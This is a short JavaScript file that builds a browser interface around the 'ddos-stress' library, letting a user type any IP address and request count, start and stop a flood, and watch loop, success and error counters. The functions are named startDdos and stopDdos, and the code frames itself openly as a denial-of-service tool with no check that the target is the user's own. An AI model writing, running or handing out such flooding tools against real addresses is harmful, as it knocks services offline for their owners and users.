var Stress = require('ddos-stress');

// Create new instance of DDoS Stress
var stress = new Stress();

const start = document.querySelector('#start'),
    stop = document.querySelector('#stop'),
    ipAddress = document.querySelector('#ipAddress'),
    requestQuantity = document.querySelector('#requestQuantity'),
    loopNodes = document.querySelector('#loopNodes'),
    activeNodes = document.querySelector('#activeNodes'),
    errorNodes = document.querySelector('#errorNodes');

start.addEventListener('click', () => {
    console.log('ipAddress', ipAddress.value, 'requestQuantity', requestQuantity.value)

    startDdos()
    setInterval(() => getStats(), 1000)
})

stop.addEventListener('click', () => {
    stopDdos()
})

const startDdos = () => {
    try {
        console.warn('DDoS started');
        stress.runningState = true;
        stress.resetStats();
        stress.run(ipAddress.value.toString(), Number(requestQuantity.value))
    } catch (e) {
        throw 'Что то пошло не так!'
    }
}

const stopDdos = () => {
    console.warn('DDoS stopped');
    stress.runningState = false;
}

const getStats = () => {
    loopNodes.textContent = stress.stats.loop;
    activeNodes.textContent = stress.stats.success;
    errorNodes.textContent = stress.stats.errors;
}